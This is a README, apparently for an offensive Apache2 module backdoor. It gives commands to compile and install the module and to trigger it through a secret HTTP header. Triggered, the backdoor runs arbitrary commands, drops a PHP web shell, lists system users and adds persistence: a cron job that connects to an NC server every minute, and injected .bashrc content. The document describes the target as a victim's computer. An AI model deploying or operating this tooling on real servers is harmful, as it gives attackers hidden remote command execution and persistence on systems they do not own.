# Apache2-Module-Backdoor


### Compiling the Module.

```
sudo apxs -i -a -c cronjob_backdoor.c
```
After compiling you need to restart the apache2 service by using the following command:
```
sudo service apache2 restart
```

### Triggering the BackDoor.
```
sudo curl -H "sourpatchkids: sourpatchkids " http://localhost
```
The keyword `sourpatchkids` needs to be in the header. Normal requests without the keyword wont trigger the code. 

### Removing the BackDoor.

```
rm /etc/apache2/mods-enabled/backdoor.load
rm /etc/apache2/mods-available/backdoor.load
```
Once again you will need to restart the apache2 service. 

### Multiple Features 
- Add cronjob to system account
- Removes A cronjob from system
- Run any command
- Read access.log file

```
sudo curl -H "sourpatchkids: sourpatchkids" -H "API-Key: cronjob" http://localhost
```

### Client.py
This runs the commands `id; ls`. The `cmd` is what tells it to also provide the command.
```
python3 client.py cmd "id; ls"
```
- clean_cron -> Will remove any cronjobs
- cronjob    -> Will add a cronjob
- access.log -> Will view access.log
### Help
This will show the help menu. 
```
python3 client.py help
```
## Advanced Backdoor

### List System Users
```
sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=users
```
### Clean Backdoor
Removes php shell & cronjob.
```
sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=clean
```
### Shell
Drop a PHP shell in the `/var/www/html` folder.
```
sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=shell
```
### Status
Returns if there is a webshell or cronjob on the victim's computer.
```
sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=status
```
### Cronjob
Will enable a cronjob that connects to a NC server every minute. If one exists it wont add one.
```
sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=cronjob
```
### Info
Gets information about the web server.
```
sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=info
```
### Bashrc

You give it a base64 encoded sring which it adds to the `.basharc`. It will also use the `source` command on the file

```
sudo curl -H "sourpatchkids: sourpatchkids" -H "x-lang: YWxpYXMgbWMyPSJwd2QiCg==" http://localhost/errorteacups?url=bashrc
```
# Sources

- https://httpd.apache.org/docs/current/developer/modguide.html
- https://www.tarlogic.com/blog/backdoors-modules-apache/